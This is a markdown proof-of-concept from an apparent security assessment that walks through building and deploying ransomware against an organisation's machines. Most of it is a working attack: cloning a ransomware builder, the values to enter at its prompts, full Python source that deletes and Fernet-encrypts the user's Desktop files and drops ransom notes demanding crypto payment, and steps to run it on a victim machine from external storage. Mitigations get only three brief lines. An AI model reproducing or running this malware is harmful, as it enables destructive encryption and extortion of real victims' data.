# POC 5 - Ransomware to Destroy Files

## Description

Ransomware is a form of malware which is designed to encrypt files within a device and rendering files and systems to be useless. After the files are encrypted, threat actors usually demand a ransom in exchange for the key to decrypt the files within the system.

While some Organisations pay the threat actor for the key, it is not a guarantee that the threat actor will honour their words and provide the correct decryption key. This will result in Organisations losing their reputation, money and files from the attack. 

This attack aims to outline the threats posed to the organisation from a Ransomware attack. 

## Steps to Carry Out Exploitation

There are a total of 2 steps to be caried out during the process of conducting a reverse shell attack.

The following are the 2 steps taken during the POC.

1. [Preparation Phase](#preparations)
2. [Exploitation Phase](#exploitation)

The preparation phase covers all preperatory needs inclusive of the installation of tools that can possibly prepared by the threat attacker. 

The exploitation phase outlines the steps that the insider can possibly take to both remain undetected within the machine along with achieving the targeted goal of the insider threat attacker.

### Preparations

1. Clone the Ac0ddRansom repository

```py
git clone https://github.com/Hex1629/Ac0ddRansom.git
```

2. Navigate into the repository and execute the file

```
# Navigate into the repository
cd Ac0ddRansom

# Command to execute the script to create the payload
python ransomware_builder.py
```

![Creating a Ransomware Payload](/images/POC_5/Preparation/POC5_Ransomware_Builder.png)

3. Type in the following values at the various prompts and after the ransomware will be built

|Prompt|Value|
|--|--|
|Path|2|
|Path|Desktop|
|File Extension|[Input_File_Extension]|
|Encryption|Fernet|
|File Ransomware Delete|N|
|Note|NOTICE|
|Note_Data|N|
|Ransomware Name|[Input_Ransomware_Name]|
|Number|[Input_Ransomware_Number]|
|Crypto Type|[Input_Crypto_Type]|
|Address|[Input_Crypto_Currency_Wallet_Number]|
|Address Contact|[Input_Contact_Number]|
|Setup|2|
|Name|[Input_Your_Name]|
|Ransomware Files Name|[Input_Ransomware_Name]|

![Ransomware Build Status](/images/POC_5/Preparation/POC5_Ransomware_Build_Status.png)

4. The code should look something like this

```py
import os
import base64
from cryptography.fernet import Fernet

print('Ransomware Runing (No Remove!) ')

# Scan Files
def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            if '[Input_File_Extension]' in name_files:
                continue
            allFiles.append(os.path.join(home, name_files))
    return allFiles

#Path Files
path_files = os.path.expanduser('~') + '/Desktop'

key_fernet_start = Fernet.generate_key()

#Encryption
num = 0
openFiles = scan(path_files)
for file_os in openFiles:
     #Read Files
     files = open(file_os, "rb")
     Data_Text = files.read()
     files.close()

     #Files Remove 
     os.remove(file_os)
     
     # Fernet
     fernet_start = Fernet(key_fernet_start)
     encodedBytes = fernet_start.encrypt(Data_Text)
     encodedStr = str(encodedBytes,"utf-8")
     
     # Write Files
     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '[Input_File_Extension]')
     files2 = open(output, "w")
     files2.write(encodedStr)
     num += 1

# Note
num2 = 0
for dirName, subdirList, fileList in os.walk(path_files):
    OutputFile = os.path.join(os.path.join(dirName),f"NOTICE.txt")
    file = open(OutputFile,'w')
    file.write('''Attention maybe you have been infected by [Input_Ransomware_Name]!

All your file have been overwrite by Encryption Fernet

Don't worry, you can return all your files!

The only method of recovering files is to purchase decrypt tool and unique key for you.
This software will decrypt all your encrypted files.
To get this software you need write on our e-mail below

What guarantees do we give to you?
Its just a business. We absolutely do not care about you and your deals, except getting benefits.

Ransomware Make By [Input_Your_Name]

<--------- Rule
DONT try to change files by yourself, DONT use any third party software for restoring your data.
Do not rename encrypted files.

Contact us:[Input_Contact_Number]

Send $1 worth of [Input_Crypto_Type] to this Address:
[Input_Crypto_Currency_Wallet_Number]

Logs Ransomware --------------->
Personal Ransomware ID: emhevrHXUgxGDsadZThnCSDPFMT2M01ULP46Wv9n4hoGwHREOJZ2Jzi8z_86437627344
<--------------- Logs Ransomware
''')
    file.close()
    num2 += 1

print("Ransomware Done Runing!!!!!!")
```

4. Copy this file into an external storage for exploitation

### Exploitation

1. Install Python from the following site within the organisations system

```
https://www.python.org/downloads/release/python-3100/
```

2. Run the installer as Administrator and add python to path

3. Copy the file over from the external storage device into the machine

![Ransomware file in system](/images/POC_5/Exploitation/POC5_Ransomware_in_Victim_Machine.png)

4. Open Command Prompt and execute the following command

```cmd
python [Input_Ransomware_Name]
```

![Executing Built Ransomware in Victims Machine](/images/POC_5/Exploitation/POC5_Executing_Ransomware_in_Victim_Machine.png)

5. Notice that the files within the directory stated is encrypted and the ransomware note appears

![Ransomware Note](/images/POC_5/Exploitation/POC5_Ransomware_Note.png)

## Possible Mitigations and Recommendations

1. Perform Backup Regularly and Restore Offline Backup
2. Crisis Management Plan
3. Update antivirus signature database

## References

[Ac0ddRansom](https://github.com/Hex1629/Ac0ddRansom)
[What is Ransomware](https://www.cisa.gov/stopransomware/resources)  
[Converting Python File to exe File](https://www.geeksforgeeks.org/convert-python-script-to-exe-file/)    

### Similar Repositories performing Ransomware
[Malware with Python](https://github.com/amiroooamiran/Malware-with-python)  
[MineHackingTools](https://github.com/MinegamesAdministrationTool-zz/MineHackingTools)
